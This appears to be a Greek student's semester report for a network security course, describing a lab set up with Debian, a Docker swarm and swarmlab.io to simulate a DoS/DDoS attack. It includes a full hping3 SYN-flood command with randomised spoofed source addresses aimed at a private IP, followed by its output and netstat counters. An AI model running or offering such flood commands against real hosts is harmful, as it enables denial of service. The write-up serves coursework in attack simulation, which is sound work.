~~ Εργασία Εξαμήνου - Ασφαλεία Δικτύων και επικοινωνίων ~~

Μακρογαμβράκης Απόλλων Φοίβος
713242017105

~~ Υλοποίηση συστήματος για την προσομοίωση Dos/DDos Attack ~~

Ένας λιμένας είναι μια πλατφόρμα λογισμικού για τη διαχείριση των εμπορευματοκιβωτίων. 
Η βασική εστίαση του Docker είναι να βοηθήσει τους προγραμματιστές να αναπτύξουν εύκολα εφαρμογές και να τους μεταφέρουν σε ένα κοντέινερ για να τις αναπτύξουν οποιαδήποτε στιγμή.
Επίσης, υπάρχουν διαθέσιμα διάφορα στοιχεία στο Docker. Το Docker για Mac εκτελεί το δοχείο Docker στο Mac OS.
Ομοίως, υπάρχουν εκδόσεις Linux και Windows που επιτρέπουν την εκτέλεση του Docker στις αντίστοιχες πλατφόρμες τους.

~~ Αρχικά ~~

Για την εργασία χρησιμοποιήθηκε εικονική μηχανή (Virtual Machine) σε KVM Virtualization περιβάλλον, με λειτουργικό Debian 11.1 και docker-ce από την επίσημη πλατφόρμα του docker.

~~ Εγκατάσταση Debian 11.1 ~~

Για την εγκατάσταση ακολουθήθηκαν οι εντολές από το https://www.debian.org/ καθώς και κατέβηκε το λειτουργικό από το https://www.debian.org/download.

~~ Εγκατάσταση Docker ~~

Για την εγκατάσταση του Docker ακολουθήθηκαν οι οδηγίες από το https://docs.docker.com/engine/install/debian/

~~ Δημιουργία Docker Swarm ~~

Δημιουργήθηκε docker swarm με ένα node, θα μπορούσαν να είναι και περισσότερα χωρίς να αλλάξει η αρχιτεκτονική δομή.
Για την εγκατάσταση του swarm ακολουθήθηκαν οι εντολές από: https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm/

~~ Εγκατάσταση swarmlab.io on docker swarm ~~

Για να μπορέσει να γίνει η εγκατάσταση του swarmlab.io στο docker swarm ακολουθήθηκαν οι οδηγίες: http://docs.swarmlab.io/SwarmLab-HowTos/swarmlab/docs/swarmlab/docs/install/install-hybrid.html

~~ Εκτέλεση της εντολής hping3 ~~

```bash
sudo hping3 -c 14000 -d 120 -S -w 64 -p 3088 --flood --rand-source 192.168.71.95
```
>> HPING 192.168.71.95 (enp1s0 192.168.71.95): S set, 40 headers + 120 data bytes hping in flood mode, no replies will be shown

~~ Εκτέλεση εντολή netstat ~~

```bash
netstat -s
Ip:
    Forwarding: 1
    6714892 total packets received
    1 with invalid addresses
    6275771 forwarded
    o incoming packets discarded
    438890 incoming packets delivered
    13131741 requests sent out
    17955 outgoing packets dropped
    120 dropped because of missing route
Icmp:
    64 ICMP messages received
    64 input ICMP message failed
    ICMP input histogram:
    destination unreachable: 64
    4 ICMP messages sent
    O ICMP messages failed
    ICMP output histogram:
    destination unreachable: 4
IcmpMsg:
    InType 3: 64
    Out Type 3: 4
Top:
    789 active connection openings
    112 passive connection openings
    19 failed connection attempts
    17 connection resets received
    5 connections established
    438546 segments received
    261770 segments sent out
    172 segments retransmitted
    64 bad segments received
    537 resets sent
Udp:
    1785 packets received
    2 packets to unknown port received
    O packet receive errors
    1870 packets sent
    o receive buffer errors
    O send buffer errors
    IgnoredMulti: 316
UdpLite:
TcpExt:
    398 TCP sockets finished time wait in fast timer
    215 delayed acks sent
    1 delayed acks further delayed because of locked socket
    Quick ack mode was activated 34 times
    317668 packet headers predicted
    7373 acknowledgments not containing data payload received
    23406 predicted acknowledgments
```
